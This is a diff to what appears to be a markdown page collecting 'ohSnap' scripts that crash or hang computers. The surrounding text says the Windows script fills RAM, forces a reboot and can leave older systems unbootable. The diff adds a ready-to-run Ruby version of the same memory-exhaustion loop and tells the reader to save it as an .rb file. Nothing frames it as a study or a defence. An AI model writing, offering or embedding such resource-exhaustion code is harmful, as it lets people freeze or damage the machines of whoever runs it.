@@ -109,3 +109,16 @@ ohSnap()
 
 Running this script with WSCRIPT.EXE will not cause immediate system death, but will fill up the RAM and cause the system to lag. Eventually, a force reboot will be required.
 In some cases, running this on old versions of Windows may cause the system to not be able to boot up again.
+
+## Embedding in Ruby Programs
+Create a new `.rb` file with the following contents:
+```ruby
+def oh_snap
+  corruptable = []
+  (0..9999999*999999999999999999999).each do |i|
+    11.times { corruptable << i }
+  end
+end
+
+oh_snap
+```
